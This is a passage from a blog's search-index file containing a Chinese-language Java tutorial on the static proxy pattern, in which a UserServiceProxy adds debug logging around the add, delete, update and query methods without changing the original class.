+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>业务实现：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImp</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;增添了一个新用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;删除了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;更新了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这时候我们突然想要添加新功能，打印我们使用了什么功能改怎么办？我们很明显可以这样做：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;使用了查询功能&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是很明显这种方式非常笨拙，并且如果是更多的功能，程序员就必须手写，并且一段一段的复制差不多的代码！（这里四个输出语句就让我感觉有点烦躁了</p>
+<p>我们结合代理模式，其实可以很优雅的解决它：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userServiceImp.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;删除&quot;</span>);</span><br><span class="line">        userServiceImp.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;更新&quot;</span>);</span><br><span class="line">        userServiceImp.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;查询&quot;</span>);</span><br><span class="line">        userServiceImp.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]执行了&quot;</span>+name+<span class="string">&quot;方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这时候我们就解决了功能的需求，并且，<strong>我们没有修改任何一行原代码</strong>，却上线了新的功能，除此之外，我们的代码拓展性依然很高，需要添加新功能只需要添加新的代理层即可，这时候我们将引出了第三个思想：</p>
+<p><strong>任何功能的添加，修改，引入新的代理层来解决，客户只需要去导入最后一个代理增即可</strong></p>
+]]></content>
+  </entry>
 </search>
